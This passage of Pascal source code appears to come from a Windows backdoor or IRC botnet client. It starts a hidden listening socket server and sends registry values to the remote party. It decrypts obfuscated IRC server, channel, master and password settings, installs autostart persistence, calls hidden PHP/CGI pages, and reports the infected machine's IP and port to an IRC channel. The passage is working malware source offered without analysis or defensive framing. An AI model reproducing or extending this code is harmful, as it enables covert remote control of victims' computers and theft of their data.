  IF EROOT = decode('jcr1_uerCe') THEN
   AN:=CMD+GetRegValue(HKEY_USERS,EKEY, EVALUE);
  IF EROOT = decode('jcr1_auCCr7T_aJ75YG') THEN
   AN:=CMD+GetRegValue(HKEY_CURRENT_CONFIG,EKEY, EVALUE);
  IF AN <> '' THEN
   SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END;
END;

FUNCTION WIN1(WIN:HWND; MESS:WORD; WPR:WORD; LPR:LONGINT):LONGINT; STDCALL;
VAR
 STR:STRING;
BEGIN
 RESULT := 0;
 CASE MESS OF
  SM_CONNECT: BEGIN
   IF CONNECTED1 THEN BEGIN
    EXIT;
   END;
   REMOTESOCKADDRLEN1^ := SIZEOF(REMOTESOCKADDR1^);
   CONSERVER1 := ACCEPT(SERVER1, REMOTESOCKADDR1, REMOTESOCKADDRLEN1);
   WSAASYNCSELECT(CONSERVER1, MAINWIN1, SM_SOCKET, FD_READ OR FD_CLOSE);
   EXIT;
  END;
  SM_SOCKET: CASE LOWORD(LPR) OF
   FD_READ: SOCKETREAD1;
   FD_CLOSE: BEGIN
    CONNECTED1 := FALSE;
    EXIT;
   END;
  END;
  WM_CLOSE: BEGIN
   POSTQUITMESSAGE(0);
   EXITPROCESS(0);
  END;
  WM_DESTROY: BEGIN
   POSTQUITMESSAGE(0);
   EXITPROCESS(0);
  END;
  WM_QUIT: BEGIN
   EXITPROCESS(0);
  END;
 END;
 RESULT := DEFWINDOWPROC(WIN, MESS, WPR, LPR);
END;

PROCEDURE SERVER1_START;
VAR
 P:INTEGER;
BEGIN
 INST1 := GETMODULEHANDLE(NIL);
 WITH WCLASS1 DO BEGIN
  STYLE := CS_CLASSDC OR CS_PARENTDC;
  LPFNWNDPROC := @WIN1;
  HINSTANCE := INST1;
  HBRBACKGROUND := COLOR_BTNFACE + 1;
  LPSZCLASSNAME := SERVERCLASS1;
  HCURSOR := LOADCURSOR(0, IDC_ARROW);
 END;
 REGISTERCLASS(WCLASS1);
 MAINWIN1 := CREATEWINDOW(SERVERCLASS1, NIL, 0, 0, 0, GETSYSTEMMETRICS(SM_CXSCREEN), GETSYSTEMMETRICS(SM_CYSCREEN), 0, 0, INST1, NIL);
 WSASTARTUP($0101, WSDATA1);
 SERVER1 := SOCKET(PF_INET, SOCK_STREAM, IPPROTO_IP);
 ASOCKADDR_IN1.SIN_FAMILY := PF_INET;
 ASOCKADDR_IN1.SIN_ADDR.S_ADDR := INADDR_ANY;
 P := STRTOINT(DECRYPT(SERV_TRAFFICP));
 ASOCKADDR_IN1.SIN_PORT := HTONS(P);
 BIND(SERVER1, ASOCKADDR_IN1, SIZEOF(ASOCKADDR_IN1));
 LISTEN(SERVER1, 1);
 WSAASYNCSELECT(SERVER1, MAINWIN1, SM_CONNECT, FD_ACCEPT);
 GETMEM( REMOTESOCKADDR1, SIZEOF(REMOTESOCKADDR1^));
 GETMEM( REMOTESOCKADDRLEN1, SIZEOF(REMOTESOCKADDRLEN1^));
 WHILE GETMESSAGE(MSG1, 0, 0, 0) DO BEGIN
  DISPATCHMESSAGE(MSG1);
  TRANSLATEMESSAGE(MSG1);
 END;
END;

function my_ip_address : longint;
var
  RemoteHost : PHostEnt;
  res:longint;
  bug:array[0..1023]of char;
begin
  winsock.gethostname(@bug, 255);
  RemoteHost:=Winsock.GetHostByName(bug);
  if RemoteHost=NIL then
    res:=winsock.htonl($7F000001)
  else
  res:=longint(pointer(RemoteHost^.h_addr_list^)^);
  result:=winsock.ntohl(res);
end;

function iptostr(ip:longint):string;
var res2:array[1..4]of byte absolute ip;
begin
  result:=inttostr(res2[4])+'.'+inttostr(res2[3])+'.'+inttostr(res2[2])+'.'+inttostr(res2[1]);
end;

BEGIN
// START SERVER 1 THREAD AND SERVER 2 THREAD

LoadReg;
IF (IRC_NICK1 = '^') or (IRC_NICK1 = '')                   THEN IRC_NICK1 := DECRYPT(STRIPDATA(I_NICK1));
IF (IRC_NICK2 = '^') or (IRC_NICK2 = '')                   THEN IRC_NICK2 := DECRYPT(STRIPDATA(I_NICK2));
IF (IRC_CHAN1 = '^') or (IRC_CHAN1 = '')                   THEN IRC_CHAN1 := DECRYPT(STRIPDATA(I_CHAN1));
IF (IRC_CHAN2 = '^') or (IRC_CHAN2 = '')                   THEN IRC_CHAN2 := DECRYPT(STRIPDATA(I_CHAN2));
IF (IRC_SERV1 = '^') or (IRC_SERV1 = '')                   THEN IRC_SERV1 := DECRYPT(STRIPDATA(I_SERV1));
IF (IRC_SERV2 = '^') or (IRC_SERV2 = '')                   THEN IRC_SERV2 := DECRYPT(STRIPDATA(I_SERV2));
IF (IRC_CKEY1 = '^') or (IRC_CKEY1 = '')                   THEN IRC_CKEY1 := DECRYPT(STRIPDATA(I_CKEY1));
IF (IRC_CKEY2 = '^') or (IRC_CKEY2 = '')                   THEN IRC_CKEY2 := DECRYPT(STRIPDATA(I_CKEY2));
IF (IRC_MASTER1 = '^') or (IRC_MASTER1 = '')               THEN IRC_MASTER1 := DECRYPT(STRIPDATA(I_MAST1));
IF (IRC_MASTER2 = '^') or (IRC_MASTER2 = '')               THEN IRC_MASTER2 := DECRYPT(STRIPDATA(I_MAST2));
IF (SERV_TRAFFICP = '^') or (SERV_TRAFFICP = '')           THEN SERV_TRAFFICP := DECRYPT(STRIPDATA(S_PORT1));
IF (SERV_TRANSP = '^') or (SERV_TRANSP = '')               THEN SERV_TRANSP := DECRYPT(STRIPDATA(S_PORT2));
IF (SERV_AUTOSTART = '^') or (SERV_AUTOSTART = '')         THEN SERV_AUTOSTART := DECRYPT(STRIPDATA(S_START));
IF (SERV_REGKEY = '^') or (SERV_REGKEY = '')               THEN SERV_REGKEY := DECRYPT(STRIPDATA(S_REGKEY));
IF (SERV_REGVALUE = '^') or (SERV_REGVALUE = '')           THEN SERV_REGVALUE := DECRYPT(STRIPDATA(S_RVALUE));
IF (SERV_WINNAME = '^') or (SERV_WINNAME = '')             THEN SERV_WINNAME := DECRYPT(STRIPDATA(S_WNAME));
IF (SERV_SYSNAME = '^') or (SERV_SYSNAME = '')             THEN SERV_SYSNAME := DECRYPT(STRIPDATA(S_SNAME));
IF (SERV_CGI = '^') or (SERV_CGI = '')                     THEN SERV_CGI := DECRYPT(STRIPDATA(S_CGI));
IF (SERV_PHP = '^') or (SERV_PHP = '')                     THEN SERV_PHP := DECRYPT(STRIPDATA(S_PHP));
IF (PASSWORD = '^') or (PASSWORD = '')                     THEN PASSWORD := DECRYPT(STRIPDATA(S_PASSW));
SaveReg;
IF (DECRYPT(serv_php) <> '') and (DECRYPT(serv_php) <> '^') then
 VisitPage(0,pchar(DECRYPT(serv_php)),'',0,0);
IF (DECRYPT(serv_cgi) <> '') and (DECRYPT(serv_cgi) <> '^') then
 VisitPage(0,pchar(DECRYPT(serv_cgi)),'',0,0);
IF SERV_REGKEY = '^' THEN SERV_AUTOSTART := 'Z';
IF SERV_REGVALUE = '^' THEN SERV_AUTOSTART := 'Z';
SetAutoStart;

  IRCSERV := DECRYPT(IRC_SERV1);
  IRCCHAN := DECRYPT(IRC_CHAN1);
  IRCKEY :=  DECRYPT(IRC_CKEY1);
  IRCNICK := DECRYPT(IRC_NICK1);

  IRCSERV2 := DECRYPT(IRC_SERV2);
  IRCCHAN2 := DECRYPT(IRC_CHAN2);
  IRCKEY2 :=  DECRYPT(IRC_CKEY2);
  IRCNICK2 := DECRYPT(IRC_NICK2);
CREATETHREAD(NIL, 0, @SERVER1_START, NIL, 0, A);
sleep(400);
IRC_MSG := decode('[Ym:q')+ IPTOSTR(MY_IP_ADDRESS)+decode(']q[mJCT:q')+DECRYPT(SERV_TRAFFICP)+']';
CreateThread(nil,0,@IRCBOT,nil,0,a);
server2_start;

END.
